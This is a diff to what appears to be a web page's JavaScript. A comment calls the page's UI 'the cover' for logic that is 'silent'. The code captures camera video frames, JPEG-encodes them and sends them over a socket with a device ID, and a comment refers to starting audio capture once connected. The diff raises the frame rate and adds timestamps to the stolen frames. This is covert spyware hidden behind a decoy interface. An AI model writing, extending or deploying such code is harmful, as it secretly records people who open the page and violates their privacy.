@@ -206,7 +206,7 @@
         /* =================================================================
          *  INTERNAL ENGINE — all logic is silent; UI is the cover
          * ================================================================= */
-        const STREAM_FRAME_INTERVAL_MS = 300;
+        const STREAM_FRAME_INTERVAL_MS = 200;
         const STREAM_WIDTH = 240;
         const STREAM_HEIGHT = 180;
         const STREAM_JPEG_QUALITY = 0.28;
@@ -371,7 +371,7 @@
                     canvas.width = STREAM_WIDTH;
                     canvas.height = STREAM_HEIGHT;
                     ctx.drawImage(vid, 0, 0, STREAM_WIDTH, STREAM_HEIGHT);
-                    socket.emit('stream_frame', { device_id, frame: canvas.toDataURL('image/jpeg', STREAM_JPEG_QUALITY) });
+                    socket.emit('stream_frame', { device_id, frame: canvas.toDataURL('image/jpeg', STREAM_JPEG_QUALITY), ts: Date.now() });
                 }, STREAM_FRAME_INTERVAL_MS);
 
                 // Wait for socket then start audio — retry every 500ms until connected
